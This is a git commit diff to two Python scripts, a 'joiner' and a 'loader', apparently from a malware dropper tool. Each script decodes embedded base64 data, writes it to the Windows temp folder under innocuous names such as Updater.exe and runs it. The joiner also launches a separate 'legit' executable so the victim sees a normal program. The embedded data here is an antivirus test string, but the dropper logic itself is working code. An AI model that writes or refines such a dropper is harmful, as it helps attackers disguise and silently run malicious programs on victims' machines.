99aab12adecca3d4088bfb5300490f2f4748d446
httpshotmaker <80145620+httpshotmaker@users.noreply.github.com>
2022-08-18 13:56:34 +0300

    Fixing empty window

--- joiner_mask.py
+++ joiner_mask.py
@@ -3,14 +3,16 @@ import subprocess as sbp
 import time
 from base64 import b64decode as b64d
 import sys
+import subprocess
+
 time.sleep(1)
 temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
 b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f"{temp}\\Updater.exe","wb")as f:
     f.write(b64d(b64data))
-os.system(f"{temp}\\Updater.exe")
+subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 legit = b'BSVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f'{temp}\\Launcher.exe', 'wb')as l:
     l.write(b64d(legit))
-os.system(f'{temp}\\Launcher.exe')
+subprocess.Popen(f"{temp}\\Launcher.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 sys.exit()
--- loader_mask.py
+++ loader_mask.py
@@ -8,5 +8,5 @@ temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
 b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f"{temp}\\Loader.exe","wb")as f:
     f.write(b64d(b64data))
-os.system(f"{temp}\\Loader.exe")
+subprocess.Popen(f"{temp}\\Loader.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 sys.exit()
